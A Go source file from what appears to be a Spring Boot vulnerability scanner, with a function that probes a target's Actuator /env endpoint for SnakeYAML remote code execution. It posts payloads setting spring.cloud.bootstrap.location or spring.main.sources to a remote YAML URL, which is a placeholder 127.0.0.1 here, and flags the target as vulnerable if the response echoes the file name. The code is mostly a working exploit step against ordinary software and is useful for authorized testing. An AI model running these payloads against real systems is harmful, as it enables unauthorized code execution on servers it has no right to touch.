package exppackage

import (
	"bytes"
	"fmt"
	"github.com/fatih/color"
	"net/http"
	"ssp/common"
	"strings"
)

func SnakeYAML_RCE(url, proxyURL string) {

	// 设置请求头
	oldHeaders1 := map[string]string{
		"User-Agent":   "Your_User_Agent_Here",
		"Content-Type": "application/x-www-form-urlencoded",
	}
	oldHeaders2 := map[string]string{
		"User-Agent":   "Your_User_Agent_Here",
		"Content-Type": "application/json",
	}

	// 设置负载内容
	payload1 := "spring.cloud.bootstrap.location=http://127.0.0.1/example.yml"
	payload2 := `{"name":"spring.main.sources","value":"http://127.0.0.1/example.yml"}`

	// 合并请求头
	Headers1 := common.MergeHeaders(oldHeaders1)
	Headers2 := common.MergeHeaders(oldHeaders2)

	// 创建第一个请求
	req1, err := http.NewRequest("POST", url+"env", bytes.NewBufferString(payload1))
	if err != nil {
		fmt.Println("Error creating request:", err)
		return
	}
	// 设置请求头
	for key, value := range Headers1 {
		req1.Header.Set(key, value)
	}

	// 使用代理
	_, body1, err := common.MakeRequest(url+"env", "POST", proxyURL, Headers1, payload1)
	if err != nil {
		color.Yellow("[-] URL为：%s，的目标积极拒绝请求，予以跳过\n", url)
		return
	}

	// 创建第二个请求
	req2, err := http.NewRequest("POST", url+"env", bytes.NewBufferString(payload2))
	if err != nil {
		fmt.Println("Error creating request:", err)
		return
	}
	// 设置请求头
	for key, value := range Headers2 {
		req2.Header.Set(key, value)
	}

	// 使用代理
	_, body2, err := common.MakeRequest(url+"env", "POST", proxyURL, Headers2, payload2)
	if err != nil {
		color.Yellow("[-] URL为：%s，的目标积极拒绝请求，予以跳过\n", url)
		return
	}

	// 检查响应内容
	if strings.Contains(string(body1), "example.yml") {
		common.PrintVulnerabilityConfirmation("SnakeYAML_RCE-1", url+"env", payload1, "9")
	} else if strings.Contains(string(body2), "example.yml") {
		common.PrintVulnerabilityConfirmation("SnakeYAML_RCE-2", url+"env", payload2, "9")
	} else {
		color.Yellow("[-] %s 未发现SnakeYAML-RCE漏洞\n", url)
	}
}
